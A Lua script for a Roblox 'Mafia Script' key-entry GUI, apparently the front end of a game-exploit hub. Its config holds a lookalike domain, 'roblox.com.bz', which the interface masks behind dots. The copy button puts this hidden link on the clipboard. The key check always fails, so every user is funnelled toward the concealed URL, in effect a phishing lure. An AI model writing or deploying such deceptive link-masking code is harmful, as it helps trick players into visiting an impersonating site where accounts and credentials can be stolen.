-- // Mafia Script — Key System GUI
-- // Dark Theme | Rounded | Gradient Accents

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- // CONFIG
local GROUP_LINK = "https://roblox.com.bz/communities/468737843/"

-- // KEY VALIDATION — replace with your own logic
local function isKeyValid(key)
    -- TODO: add your own key checking logic here
    -- Example: return key == "MY-SECRET-KEY"
    return false
end

-- // PALETTE
local C = {
    BG       = Color3.fromRGB(8,  8,  12),
    FRAME    = Color3.fromRGB(14, 14, 20),
    SURFACE  = Color3.fromRGB(20, 20, 30),
    BORDER   = Color3.fromRGB(36, 36, 54),
    ACCENT1  = Color3.fromRGB(168, 85,  247),
    ACCENT2  = Color3.fromRGB(236, 72,  153),
    GREEN    = Color3.fromRGB(34,  197, 94),
    GREEN2   = Color3.fromRGB(16,  185, 129),
    RED      = Color3.fromRGB(239, 68,  68),
    WHITE    = Color3.fromRGB(240, 240, 255),
    MUTED    = Color3.fromRGB(120, 120, 160),
    DIM      = Color3.fromRGB(55,  55,  80),
}

-- // HELPERS
local function tween(obj, props, t, style)
    TweenService:Create(obj, TweenInfo.new(t or 0.25, style or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end
local function corner(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r or 12) c.Parent = p end
local function stroke(p, col, thick) local s = Instance.new("UIStroke") s.Color = col or C.BORDER s.Thickness = thick or 1 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border s.Parent = p return s end
local function grad(p, c0, c1, rot) local g = Instance.new("UIGradient") g.Color = ColorSequence.new(c0, c1) g.Rotation = rot or 90 g.Parent = p return g end

local function label(parent, props)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.GothamBold
    l.TextColor3 = C.WHITE
    l.ZIndex = 4
    for k, v in pairs(props) do l[k] = v end
    l.Parent = parent
    return l
end

-- // SCREEN GUI
local Gui = Instance.new("ScreenGui")
Gui.Name = "MafiaScript_KeySys"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.Parent = PlayerGui

-- // OVERLAY
local Overlay = Instance.new("Frame")
Overlay.Size = UDim2.fromScale(1, 1)
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.5
Overlay.BorderSizePixel = 0
Overlay.ZIndex = 1
Overlay.Parent = Gui

-- // MAIN CARD
local Card = Instance.new("Frame")
Card.Size = UDim2.new(0, 400, 0, 490)
Card.AnchorPoint = Vector2.new(0.5, 0.5)
Card.Position = UDim2.fromScale(0.5, 0.5)
Card.BackgroundColor3 = C.FRAME
Card.BorderSizePixel = 0
Card.ZIndex = 2
Card.Parent = Gui
corner(Card, 20)
stroke(Card, C.BORDER, 1.5)
grad(Card, Color3.fromRGB(16, 14, 24), Color3.fromRGB(12, 12, 18), 150)

-- Top gradient bar
local Bar = Instance.new("Frame")
Bar.Size = UDim2.new(1, 0, 0, 3)
Bar.Position = UDim2.fromScale(0, 0)
Bar.BackgroundColor3 = C.ACCENT1
Bar.BorderSizePixel = 0
Bar.ZIndex = 5
Bar.Parent = Card
corner(Bar, 3)
grad(Bar, C.ACCENT1, C.ACCENT2, 0)

-- // ICON
local IconRing = Instance.new("Frame")
IconRing.Size = UDim2.new(0, 56, 0, 56)
IconRing.AnchorPoint = Vector2.new(0.5, 0)
IconRing.Position = UDim2.new(0.5, 0, 0, 24)
IconRing.BackgroundColor3 = C.ACCENT1
IconRing.ZIndex = 3
IconRing.Parent = Card
corner(IconRing, 18)
grad(IconRing, C.ACCENT1, C.ACCENT2, 135)

label(IconRing, {
    Size = UDim2.fromScale(1, 1),
    Text = "✦",
    TextSize = 22,
    Font = Enum.Font.GothamBold,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    ZIndex = 4,
})

-- // TITLE
label(Card, {
    Size = UDim2.new(1, -40, 0, 30),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 94),
    Text = "Mafia Script",
    TextSize = 24,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})

label(Card, {
    Size = UDim2.new(1, -40, 0, 30),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 94),
    Text = "Mafia Script",
    TextSize = 24,
    TextColor3 = C.ACCENT2,
    TextTransparency = 0.72,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})

-- // SUBTITLE
label(Card, {
    Size = UDim2.new(1, -60, 0, 40),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 134),
    Text = "Join our community to get access",
    TextSize = 13,
    Font = Enum.Font.Gotham,
    TextColor3 = C.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    TextWrapped = true,
    ZIndex = 3,
})

-- // GROUP LINK LABEL
label(Card, {
    Size = UDim2.new(1, -48, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 184),
    Text = "GROUP LINK",
    TextSize = 10,
    Font = Enum.Font.GothamBold,
    TextColor3 = C.ACCENT1,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 3,
})

-- // LINK DISPLAY BOX (hidden with dots)
local LinkFrame = Instance.new("Frame")
LinkFrame.Size = UDim2.new(1, -48, 0, 40)
LinkFrame.AnchorPoint = Vector2.new(0.5, 0)
LinkFrame.Position = UDim2.new(0.5, 0, 0, 202)
LinkFrame.BackgroundColor3 = C.SURFACE
LinkFrame.ZIndex = 3
LinkFrame.Parent = Card
corner(LinkFrame, 10)
stroke(LinkFrame, C.BORDER, 1)

local LinkAccent = Instance.new("Frame")
LinkAccent.Size = UDim2.new(0, 3, 0.6, 0)
LinkAccent.AnchorPoint = Vector2.new(0, 0.5)
LinkAccent.Position = UDim2.new(0, 0, 0.5, 0)
LinkAccent.BackgroundColor3 = C.ACCENT1
LinkAccent.ZIndex = 4
LinkAccent.Parent = LinkFrame
corner(LinkAccent, 2)
grad(LinkAccent, C.ACCENT1, C.ACCENT2, 90)

-- Masked dots instead of showing the real link
label(LinkFrame, {
    Size = UDim2.new(1, -24, 1, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    Position = UDim2.new(0, 16, 0.5, 0),
    Text = "● ● ● ● ● ● ● ● ● ● ● ● ● ● ● ●",
    TextSize = 8,
    Font = Enum.Font.Gotham,
    TextColor3 = C.DIM,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextTruncate = Enum.TextTruncate.AtEnd,
    ZIndex = 4,
})

-- // COPY BUTTON
local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(1, -48, 0, 40)
CopyBtn.AnchorPoint = Vector2.new(0.5, 0)
CopyBtn.Position = UDim2.new(0.5, 0, 0, 252)
CopyBtn.BackgroundColor3 = C.GREEN
CopyBtn.Text = ""
CopyBtn.ZIndex = 3
CopyBtn.Parent = Card
corner(CopyBtn, 10)
grad(CopyBtn, C.GREEN, C.GREEN2, 160)

local CopyLbl = label(CopyBtn, {
    Size = UDim2.fromScale(1, 1),
    Text = "⎘  Copy to Clipboard",
    TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
})

-- // DIVIDER
local Div = Instance.new("Frame")
Div.Size = UDim2.new(1, -48, 0, 1)
Div.AnchorPoint = Vector2.new(0.5, 0)
Div.Position = UDim2.new(0.5, 0, 0, 308)
Div.BackgroundColor3 = C.BORDER
Div.ZIndex = 3
Div.Parent = Card
grad(Div, C.DIM, C.FRAME, 0)

local DivTag = label(Card, {
    Size = UDim2.new(0, 50, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0, 308),
    Text = "· KEY ·",
    TextSize = 9,
    Font = Enum.Font.Gotham,
    TextColor3 = C.DIM,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
    BackgroundColor3 = C.FRAME,
    BackgroundTransparency = 0,
})
corner(DivTag, 4)

-- // ACCESS KEY LABEL
label(Card, {
    Size = UDim2.new(1, -48, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 324),
    Text = "ACCESS KEY",
    TextSize = 10,
    Font = Enum.Font.GothamBold,
    TextColor3 = C.ACCENT1,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 3,
})

-- // KEY INPUT
local KeyFrame = Instance.new("Frame")
KeyFrame.Size = UDim2.new(1, -48, 0, 40)
KeyFrame.AnchorPoint = Vector2.new(0.5, 0)
KeyFrame.Position = UDim2.new(0.5, 0, 0, 342)
KeyFrame.BackgroundColor3 = C.SURFACE
KeyFrame.ZIndex = 3
KeyFrame.Parent = Card
corner(KeyFrame, 10)
local KeyStroke = stroke(KeyFrame, C.BORDER, 1)

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(1, -20, 1, 0)
KeyInput.AnchorPoint = Vector2.new(0, 0.5)
KeyInput.Position = UDim2.new(0, 14, 0.5, 0)
KeyInput.BackgroundTransparency = 1
KeyInput.PlaceholderText = "Paste your key here…"
KeyInput.PlaceholderColor3 = C.DIM
KeyInput.Text = ""
KeyInput.Font = Enum.Font.Code
KeyInput.TextSize = 13
KeyInput.TextColor3 = C.WHITE
KeyInput.TextXAlignment = Enum.TextXAlignment.Left
KeyInput.ClearTextOnFocus = false
KeyInput.ZIndex = 4
KeyInput.Parent = KeyFrame

KeyInput.Focused:Connect(function() tween(KeyStroke, { Color = C.ACCENT1 }, 0.2) end)
KeyInput.FocusLost:Connect(function() tween(KeyStroke, { Color = C.BORDER }, 0.2) end)

-- // STATUS
local Status = label(Card, {
    Size = UDim2.new(1, -48, 0, 16),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 392),
    Text = "",
    TextSize = 11,
    Font = Enum.Font.Gotham,
    TextColor3 = C.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})

-- // SUBMIT BUTTON
local SubmitBtn = Instance.new("TextButton")
SubmitBtn.Size = UDim2.new(1, -48, 0, 40)
SubmitBtn.AnchorPoint = Vector2.new(0.5, 0)
SubmitBtn.Position = UDim2.new(0.5, 0, 0, 414)
SubmitBtn.BackgroundColor3 = C.ACCENT1
SubmitBtn.Text = ""
SubmitBtn.ZIndex = 3
SubmitBtn.Parent = Card
corner(SubmitBtn, 10)
grad(SubmitBtn, C.ACCENT1, C.ACCENT2, 160)

local SubmitLbl = label(SubmitBtn, {
    Size = UDim2.fromScale(1, 1),
    Text = "Verify Key  →",
    TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
})

-- // FOOTER
label(Card, {
    Size = UDim2.new(1, -40, 0, 18),
    AnchorPoint = Vector2.new(0.5, 1),
    Position = UDim2.new(0.5, 0, 1, -10),
    Text = "Mafia Script  ·  Authorized Access Only",
    TextSize = 9,
    Font = Enum.Font.Gotham,
    TextColor3 = C.DIM,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})

-- // ENTRANCE ANIMATION
Overlay.BackgroundTransparency = 1
Card.BackgroundTransparency = 1
Card.Position = UDim2.new(0.5, 0, 0.5, 28)

tween(Overlay, { BackgroundTransparency = 0.5 }, 0.4)
tween(Card, { BackgroundTransparency = 0, Position = UDim2.fromScale(0.5, 0.5) }, 0.5, Enum.EasingStyle.Back)

-- // HOVER FX
CopyBtn.MouseEnter:Connect(function() tween(CopyBtn, { BackgroundColor3 = Color3.fromRGB(74, 222, 128) }, 0.18) end)
CopyBtn.MouseLeave:Connect(function() tween(CopyBtn, { BackgroundColor3 = C.GREEN }, 0.18) end)
SubmitBtn.MouseEnter:Connect(function() tween(SubmitBtn, { BackgroundColor3 = Color3.fromRGB(192, 132, 252) }, 0.18) end)
SubmitBtn.MouseLeave:Connect(function() tween(SubmitBtn, { BackgroundColor3 = C.ACCENT1 }, 0.18) end)

-- // COPY LOGIC — copies the real link even though it's hidden
local copyDebounce = false
CopyBtn.MouseButton1Click:Connect(function()
    if copyDebounce then return end
    copyDebounce = true

    setclipboard(GROUP_LINK)

    CopyLbl.Text = "✓  Copied!"
    local g = CopyBtn:FindFirstChildOfClass("UIGradient")
    if g then g.Color = ColorSequence.new(Color3.fromRGB(16, 185, 129), Color3.fromRGB(5, 150, 105)) end
    tween(CopyBtn, { BackgroundColor3 = Color3.fromRGB(16, 185, 129) }, 0.2)

    task.wait(2)

    CopyLbl.Text = "⎘  Copy to Clipboard"
    if g then g.Color = ColorSequence.new(C.GREEN, C.GREEN2) end
    tween(CopyBtn, { BackgroundColor3 = C.GREEN }, 0.2)
    copyDebounce = false
end)

-- // SUBMIT LOGIC
local submitDebounce = false
SubmitBtn.MouseButton1Click:Connect(function()
    if submitDebounce then return end
    submitDebounce = true

    SubmitLbl.Text = "Checking…"
    Status.TextColor3 = C.MUTED
    Status.Text = "Verifying key…"
    tween(SubmitBtn, { BackgroundColor3 = Color3.fromRGB(50, 50, 70) }, 0.2)

    task.wait(1.2)

    if isKeyValid(KeyInput.Text) then
        Status.Text = "✓  Key accepted — loading!"
        Status.TextColor3 = C.GREEN
        SubmitLbl.Text = "✓  Verified"
        tween(SubmitBtn, { BackgroundColor3 = C.GREEN2 }, 0.3)

        task.wait(1.4)
        tween(Overlay, { BackgroundTransparency = 1 }, 0.4)
        tween(Card, { BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, -20) }, 0.4)
        task.wait(0.5)
        Gui:Destroy()

        -- TODO: put your main hub loader here
        print("[Mafia Script] Access granted.")
    else
        Status.Text = "✗  Invalid key. Try again."
        Status.TextColor3 = C.RED

        local base = KeyFrame.Position
        for _ = 1, 3 do
            tween(KeyFrame, { Position = UDim2.new(base.X.Scale, base.X.Offset + 7, base.Y.Scale, base.Y.Offset) }, 0.05)
            task.wait(0.05)
            tween(KeyFrame, { Position = UDim2.new(base.X.Scale, base.X.Offset - 7, base.Y.Scale, base.Y.Offset) }, 0.05)
            task.wait(0.05)
        end
        tween(KeyFrame, { Position = base }, 0.08)
        tween(KeyStroke, { Color = C.RED }, 0.15)
        task.wait(1.8)
        tween(KeyStroke, { Color = C.BORDER }, 0.3)

        SubmitLbl.Text = "Verify Key  →"
        tween(SubmitBtn, { BackgroundColor3 = C.ACCENT1 }, 0.3)
        submitDebounce = false
    end
end)
